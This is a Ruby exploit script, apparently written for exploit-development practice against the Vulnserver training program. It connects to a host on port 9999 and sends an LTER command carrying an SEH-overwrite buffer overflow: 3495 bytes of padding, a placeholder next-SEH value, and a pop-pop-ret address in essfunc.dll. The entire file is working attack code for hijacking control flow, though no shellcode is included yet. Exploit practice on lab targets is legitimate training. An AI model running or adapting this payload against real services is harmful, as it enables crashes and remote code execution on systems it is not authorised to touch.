#!/usr/bin/ruby
require 'socket'

target = '192.168.1.121'
port = 9999

s = TCPSocket.open(target, port)

# nseh offset at 3495
payload = "A" * 3495
payload += "BBBB"
# pop pop ret in essfunc.dll at 0x6250172b
payload += "\x2b\x17\x50\x62"
payload += "D" * (5000 - payload.length)

s.puts('LTER /.:/' + payload)
s.close()
